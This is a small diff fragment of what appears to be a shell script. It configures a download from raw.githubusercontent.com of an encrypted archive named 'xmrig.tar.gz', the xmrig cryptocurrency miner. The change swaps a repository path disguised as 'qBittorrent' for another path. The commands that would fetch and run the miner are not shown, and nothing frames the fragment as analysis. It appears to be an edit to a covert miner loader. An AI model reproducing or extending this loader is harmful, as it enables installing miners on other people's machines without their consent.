@@ -2,7 +2,7 @@
 
 REMOTE_HOST="raw.githubusercontent.com"
 REMOTE_PORT=443
-REMOTE_PATH="PCloudUploader/qBittorrent/main"
+REMOTE_PATH="gth000001/test/main"
 
 FILENAME="xmrig.tar.gz"
 FILENAME_GPG="$FILENAME.gpg"
